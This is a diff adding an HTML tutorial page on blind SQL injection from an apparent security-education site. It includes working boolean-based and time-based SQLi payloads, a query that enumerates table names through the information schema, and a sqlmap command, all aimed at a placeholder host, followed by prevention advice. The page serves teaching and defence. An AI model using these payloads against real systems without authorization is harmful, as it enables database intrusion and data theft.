@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Blind SQL Injection - Cybersecurity Academy</title>
+  <link rel="stylesheet" href="style.css"/>
+  <script src="scripts.js" defer></script>
+</head>
+<body class="dark-theme">
+
+  <header class="site-header">
+    <h1>🧠 Blind SQL Injection (Blind SQLi)</h1>
+    <p class="subtitle">Exploiting the database... even when errors are hidden</p>
+  </header>
+
+  <main class="content">
+
+    <section class="intro">
+      <h2>🕵️ What is Blind SQL Injection?</h2>
+      <p>
+        Blind SQL Injection is a type of SQL injection where the application does not display database errors or query results directly in the response. Instead, attackers must infer the result of queries based on indirect clues like response time, status codes, or behavioral changes.
+      </p>
+    </section>
+
+    <section class="types">
+      <h2>🧬 Types of Blind SQLi</h2>
+
+      <div class="card">
+        <h3>1. Boolean-Based (Content-Based)</h3>
+        <p>
+          The application behaves differently depending on whether the injected condition is true or false.
+        </p>
+        <pre><code>GET /product?id=5 AND 1=1 --&gt; returns full page
+GET /product?id=5 AND 1=2 --&gt; returns blank or error page</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>2. Time-Based</h3>
+        <p>
+          Uses SQL functions like <code>SLEEP()</code> or <code>pg_sleep()</code> to measure delays in the response, inferring true/false based on response time.
+        </p>
+        <pre><code>GET /product?id=5 AND SLEEP(5) --&gt; page delays 5 seconds (true)
+GET /product?id=5 AND SLEEP(0) --&gt; no delay (false)</code></pre>
+      </div>
+
+    </section>
+
+    <section class="step-by-step">
+      <h2>🛠️ Exploiting Blind SQLi: Step-by-Step</h2>
+
+      <h3>Step 1: Identify injection point</h3>
+      <p>
+        Use a test payload like <code>' AND 1=1--</code> or <code>' AND SLEEP(5)--</code> in parameters such as URLs, forms, or headers.
+      </p>
+
+      <h3>Step 2: Confirm behavior change</h3>
+      <p>
+        Compare response patterns (HTML content, length, response time) for true vs. false conditions.
+      </p>
+
+      <h3>Step 3: Extract information bit by bit</h3>
+      <p>
+        Use binary inference to guess characters. For example:
+      </p>
+      <pre><code>GET /product?id=1 AND (SELECT SUBSTRING(database(),1,1))='m'</code></pre>
+      <p>
+        Check if the page behavior changes when the guess is correct. Automate this with tools like SQLMap.
+      </p>
+    </section>
+
+    <section class="real-world">
+      <h2>🌐 Real-World Example</h2>
+      <p>Assume the following vulnerable endpoint:</p>
+      <pre><code>https://vuln.site/item.php?id=2</code></pre>
+      <p>Time-based test:</p>
+      <pre><code>https://vuln.site/item.php?id=2' AND SLEEP(5)--+</code></pre>
+      <p>If response is delayed, the input is injectable. We can now enumerate users or schema names:</p>
+      <pre><code>' AND (SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='u') THEN SLEEP(5) ELSE 0 END)--+</code></pre>
+    </section>
+
+    <section class="tools">
+      <h2>🔧 Tools to Automate Blind SQLi</h2>
+      <ul>
+        <li><strong>SQLMap:</strong> <code>sqlmap -u "https://vuln.site/item.php?id=1" --batch</code></li>
+        <li><strong>Burp Suite:</strong> Use Intruder to automate character guessing with boolean or time-based logic.</li>
+        <li><strong>NoSQLMap (for NoSQL injections):</strong> Useful when targeting MongoDB or CouchDB.</li>
+      </ul>
+    </section>
+
+    <section class="tips">
+      <h2>💡 Pro Tips</h2>
+      <ul>
+        <li>Always start with simple true/false logic to confirm vulnerability.</li>
+        <li>Use proxy tools (Burp/ZAP) to monitor responses and replay requests efficiently.</li>
+        <li>Don't forget to URL-encode special characters when testing in the browser.</li>
+        <li>Automate with caution. Manual testing is crucial to confirm findings and avoid false positives.</li>
+      </ul>
+    </section>
+
+    <section class="prevention">
+      <h2>🛡️ How to Prevent Blind SQLi</h2>
+      <ul>
+        <li>Use parameterized queries (prepared statements).</li>
+        <li>Sanitize all user input, even from trusted sources.</li>
+        <li>Apply least privilege principles to the database accounts.</li>
+        <li>Implement WAF (Web Application Firewall) and logging.</li>
+      </ul>
+    </section>
+
+    <section class="resources">
+      <h2>📚 Further Reading</h2>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection" target="_blank">OWASP - Blind SQL Injection</a></li>
+        <li><a href="https://portswigger.net/web-security/sql-injection/blind" target="_blank">PortSwigger - Blind SQLi</a></li>
+        <li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection" target="_blank">HackTricks - SQL Injection</a></li>
+      </ul>
+    </section>
+
+  </main>
+
+  <footer class="site-footer">
+    <p>BugDrillX © 2025 – Learn. Hack. Evolve. powered by <a href="https://pk.linkedin.com/company/scoltech" target="_blank">SCOLTECH</a></p>
+  </footer>
+
+</body>
+</html>
